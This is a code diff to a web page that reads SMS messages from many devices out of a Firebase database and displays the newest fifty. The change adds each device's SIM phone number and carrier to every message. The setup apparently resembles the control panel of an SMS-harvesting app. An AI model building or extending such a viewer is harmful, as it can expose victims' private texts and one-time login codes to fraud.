@@ -248,163 +248,185 @@
      */
 
     const smsRef = ref(db, "All_Users/sms");
+    const simDetailsRef = ref(db, "All_Users/simDetails");
+
+    let simDetailsByDevice = {};
+    let smsSnapshot = null;
+
+    function renderMessages(snapshot) {
+        smsSnapshot = snapshot;
+
+        if (!snapshot.exists()) {
+            container.innerHTML =
+                '<div class="error">📭 No messages found</div>';
+
+            counter.textContent = "0 messages";
+            counter.classList.remove("live");
+            return;
+        }
+
+        const messages = [];
+
+        // First level: DEVICE_ID
+        snapshot.forEach((deviceSnapshot) => {
+
+            const deviceId = deviceSnapshot.key;
+
+            // Second level: Firebase Push IDs
+            deviceSnapshot.forEach((smsSnapshot) => {
+
+                const pushId = smsSnapshot.key;
+                const sms = smsSnapshot.val();
+
+                if (!sms ||
+                    typeof sms !== "object" ||
+                    Array.isArray(sms) ||
+                    typeof sms.body !== "string") {
+                    return;
+                }
+
+                const sim = simDetailsByDevice[deviceId] || {};
+
+                messages.push({
+                    pushId,
+                    deviceId,
+
+                    body: sms.body,
+                    sender: sms.sender || "Unknown",
+                    numberId: sms.id ?? "",
+                    receivedDate: sms.receivedDate || "",
+                    timestamp: sms.timestamp || "",
+                    timestampMillis:
+                        Number(sms.timestampMillis) || 0,
+
+                    // Number belonging to the same device ID.
+                    sim1Number: sim.sim1Number || "",
+                    sim2Number: sim.sim2Number || ""
+                });
+            });
+        });
+
+        messages.sort((a, b) => {
+
+            const timeA =
+                a.timestampMillis ||
+                Date.parse(a.receivedDate) ||
+                Date.parse(a.timestamp) ||
+                0;
+
+            const timeB =
+                b.timestampMillis ||
+                Date.parse(b.receivedDate) ||
+                Date.parse(b.timestamp) ||
+                0;
+
+            return timeB - timeA;
+        });
+
+        const recentMessages = messages.slice(0, 50);
+
+        counter.textContent =
+            `${recentMessages.length} recent messages`;
+
+        counter.classList.add("live");
+
+        container.innerHTML = "";
+
+        const fragment =
+            document.createDocumentFragment();
+
+        recentMessages.forEach((sms) => {
+
+            const card =
+                document.createElement("div");
+
+            card.className = "sms-card";
+
+            const meta =
+                document.createElement("div");
+
+            meta.className = "meta";
+
+            const senderElement =
+                document.createElement("span");
+
+            senderElement.textContent =
+                `📨 ${sms.sender}`;
+
+            const timeElement =
+                document.createElement("span");
+
+            timeElement.className = "time";
+
+            timeElement.textContent =
+                `🕐 ${
+                    sms.receivedDate ||
+                    sms.timestamp ||
+                    "N/A"
+                }`;
+
+            meta.appendChild(senderElement);
+            meta.appendChild(timeElement);
+
+            const messageElement =
+                document.createElement("p");
+
+            messageElement.className = "msg";
+            messageElement.textContent = sms.body;
+
+            card.appendChild(meta);
+            card.appendChild(messageElement);
+
+            /*
+             * Compact metadata, matching the requested layout:
+             * Operator + number on one line, then device ID.
+             * Firebase Push ID is deliberately not displayed.
+             */
+            const operatorInfo =
+                document.createElement("div");
+
+            operatorInfo.className = "info";
+
+            const sim =
+                simDetailsByDevice[sms.deviceId] || {};
+
+            const number =
+                sms.sim1Number || sms.sim2Number || "";
+
+            const operator =
+                sim.sim1Provider ||
+                (sms.sim2Number ? sim.sim2Provider : "") ||
+                "";
+
+            operatorInfo.textContent =
+                `⚙️ Operator: ${operator || "Unknown"} · Number: ${number || "N/A"}`;
+
+            card.appendChild(operatorInfo);
+
+            const deviceInfo =
+                document.createElement("div");
+
+            deviceInfo.className = "info";
+
+            deviceInfo.textContent =
+                `📱 Device: ${sms.deviceId}`;
+
+            card.appendChild(deviceInfo);
+
+            fragment.appendChild(card);
+        });
+
+        container.appendChild(fragment);
+    }
 
     onValue(
         smsRef,
         (snapshot) => {
-
-            if (!snapshot.exists()) {
-                container.innerHTML =
-                    '<div class="error">📭 No messages found</div>';
-
-                counter.textContent = "0 messages";
-                counter.classList.remove("live");
-                return;
-            }
-
-            const messages = [];
-
-            // First level: DEVICE_ID
-            snapshot.forEach((deviceSnapshot) => {
-
-                const deviceId = deviceSnapshot.key;
-
-                // Second level: Firebase Push IDs
-                deviceSnapshot.forEach((smsSnapshot) => {
-
-                    const pushId = smsSnapshot.key;
-                    const sms = smsSnapshot.val();
-
-                    if (!sms ||
-                        typeof sms !== "object" ||
-                        Array.isArray(sms) ||
-                        typeof sms.body !== "string") {
-                        return;
-                    }
-
-                    messages.push({
-                        pushId,
-                        deviceId,
-
-                        body: sms.body,
-                        sender: sms.sender || "Unknown",
-                        numberId: sms.id ?? "",
-                        receivedDate: sms.receivedDate || "",
-                        timestamp: sms.timestamp || "",
-                        timestampMillis:
-                            Number(sms.timestampMillis) || 0
-                    });
-                });
-            });
-
-            /*
-             * Globally newest first.
-             *
-             * timestampMillis is the most reliable field in the
-             * supplied structure. Fall back to the date strings
-             * if necessary.
-             */
-            messages.sort((a, b) => {
-
-                const timeA =
-                    a.timestampMillis ||
-                    Date.parse(a.receivedDate) ||
-                    Date.parse(a.timestamp) ||
-                    0;
-
-                const timeB =
-                    b.timestampMillis ||
-                    Date.parse(b.receivedDate) ||
-                    Date.parse(b.timestamp) ||
-                    0;
-
-                return timeB - timeA;
-            });
-
-            // Same behaviour as the previous website: latest 50.
-            const recentMessages = messages.slice(0, 50);
-
-            counter.textContent =
-                `${recentMessages.length} recent messages`;
-
-            counter.classList.add("live");
-
-            container.innerHTML = "";
-
-            const fragment =
-                document.createDocumentFragment();
-
-            recentMessages.forEach((sms) => {
-
-                const card =
-                    document.createElement("div");
-
-                card.className = "sms-card";
-
-                const meta =
-                    document.createElement("div");
-
-                meta.className = "meta";
-
-                const senderElement =
-                    document.createElement("span");
-
-                senderElement.textContent =
-                    `📨 ${sms.sender}`;
-
-                const timeElement =
-                    document.createElement("span");
-
-                timeElement.className = "time";
-
-                timeElement.textContent =
-                    `🕐 ${
-                        sms.receivedDate ||
-                        sms.timestamp ||
-                        "N/A"
-                    }`;
-
-                meta.appendChild(senderElement);
-                meta.appendChild(timeElement);
-
-                const messageElement =
-                    document.createElement("p");
-
-                messageElement.className = "msg";
-                messageElement.textContent = sms.body;
-
-                card.appendChild(meta);
-                card.appendChild(messageElement);
-
-                const info =
-                    document.createElement("div");
-
-                info.className = "info";
-
-                info.textContent =
-                    `📱 Device: ${sms.deviceId}  •  Number ID: ${sms.numberId}`;
-
-                card.appendChild(info);
-
-                const pushInfo =
-                    document.createElement("div");
-
-                pushInfo.className = "info";
-
-                pushInfo.textContent =
-                    `🔑 Push ID: ${sms.pushId}`;
-
-                card.appendChild(pushInfo);
-
-                fragment.appendChild(card);
-            });
-
-            container.appendChild(fragment);
+            renderMessages(snapshot);
         },
-
         (error) => {
 
-            console.error("Firebase Error:", error);
+            console.error("Firebase SMS Error:", error);
 
             container.innerHTML =
                 `<div class="error">
@@ -416,6 +438,27 @@
         }
     );
 
+    // One shared listener for the SIM mapping. The device ID is the
+    // common key between All_Users/sms and All_Users/simDetails.
+    onValue(
+        simDetailsRef,
+        (snapshot) => {
+
+            simDetailsByDevice = snapshot.exists()
+                ? (snapshot.val() || {})
+                : {};
+
+            // Re-render the already-loaded SMS immediately so the
+            // matching number appears without waiting for new SMS.
+            if (smsSnapshot) {
+                renderMessages(smsSnapshot);
+            }
+        },
+        (error) => {
+            console.error("Firebase simDetails Error:", error);
+            // SMS feed still works even if SIM details cannot be read.
+        }
+    );
 </script>
 
 </body>
